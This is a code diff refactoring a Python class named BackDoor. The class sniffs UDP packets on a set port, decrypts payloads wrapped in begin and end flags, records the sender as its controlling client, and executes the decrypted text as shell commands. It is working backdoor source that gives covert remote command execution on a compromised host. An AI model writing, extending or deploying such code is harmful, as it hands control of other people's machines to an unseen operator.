@@ -221,12 +221,13 @@ class BackDoor:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def process_packets(self, data: str) -> None:
-        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
-        decrypted_msg = self.decrypt_data(stripped_msg)
-        print(f"Executing: {decrypted_msg}")
-        self.execute(decrypted_msg)
-
+    def authenticate_packet(self, data: str, packet) -> str:
+        decrypted_msg = self.decrypt_data(data)
+        if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
+            print(f"Received authenticated packet: {decrypted_msg}")
+            if not self.client:
+                self.set_client(packet[IP].src)
+            return decrypted_msg
 
     def execute(self, cmd: str) -> None:
         output = run(cmd, shell=True, capture_output=True, text=True)
@@ -237,14 +238,16 @@ class BackDoor:
     def filter_packets(self, packet) -> None:
         try:
             msg = packet[UDP].load.decode()
-            if UDP in packet and msg.startswith(self.flag_begin) \
-                    and msg.endswith(self.flag_close) and packet[UDP].dport == self.recv_port:
-                print(f"Received authenticated packet: {msg}")
-                if not self.client:
-                    self.set_client(packet[IP].src)
-                self.process_packets(msg)
+            if UDP in packet and packet[UDP].dport == self.recv_port:
+                val = self.authenticate_packet(msg, packet)
+                if val:
+                    self.process_packet(val)
         except:
             return
+
+    def process_packet(self, data):
+        print(f"Executing: {data}")
+        self.execute(data)
 
     def set_client(self, ip):
         print(f"Setting client ip as {ip}")
